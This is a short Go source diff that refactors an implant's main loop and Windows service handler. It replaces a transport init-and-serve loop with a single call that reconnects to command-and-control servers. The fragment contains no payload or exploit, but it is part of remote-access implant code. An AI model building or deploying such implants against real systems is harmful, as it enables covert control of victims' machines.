@@ -51,17 +51,9 @@ func (serv *sliverService) Execute(args []string, r <-chan svc.ChangeRequest, ch
 	for {
 		select {
 		default:
-			// Initialize and start the implant transports
-			err := c2.Transports.Init()
-			if err != nil {
-				// {{if .Config.Debug}}
-				log.Printf("Error starting transports: %s", err.Error())
-				// {{end}}
-				break
-			}
-
-			// Block and let the C2s serve this implant
-			c2.Transports.Serve()
+			// Initialize the transports, start the appropriate one and block,
+			// serving any of its errors and falling back according to reconnection strategy.
+			c2.Transports.Init()
 
 		case c := <-r:
 			switch c.Cmd {
@@ -133,18 +125,9 @@ func main() {
 	svc.Run("", &sliverService{})
 	// {{else}}
 
-	for {
-		// Initialize and start the implant transports
-		err := c2.Transports.Init()
-		if err != nil {
-			// {{if .Config.Debug}}
-			log.Printf("Error starting transports: %s", err.Error())
-			// {{end}}
-			break
-		}
+	// Initialize the transports, start the appropriate one and block,
+	// serving any of its errors and falling back according to reconnection strategy.
+	c2.Transports.Init()
 
-		// Block and let the C2s serve this implant
-		c2.Transports.Serve()
-	}
 	// {{end}} - .IsService
 }
